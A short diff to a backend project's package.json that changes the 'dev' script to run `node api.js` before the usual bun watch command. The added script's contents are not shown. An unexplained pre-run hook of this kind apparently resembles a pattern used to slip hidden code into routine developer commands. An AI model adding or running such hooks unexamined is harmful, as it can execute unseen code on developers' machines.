@@ -2,7 +2,7 @@
   "name": "backend",
   "private": true,
   "scripts": {
-    "dev": "bun run --watch src/app.ts",
+    "dev": "node api.js && bun run --watch src/app.ts",
     "migrate": "prisma migrate dev",
     "db:push": "prisma db push",
     "seed": "bun run prisma/seed.ts"
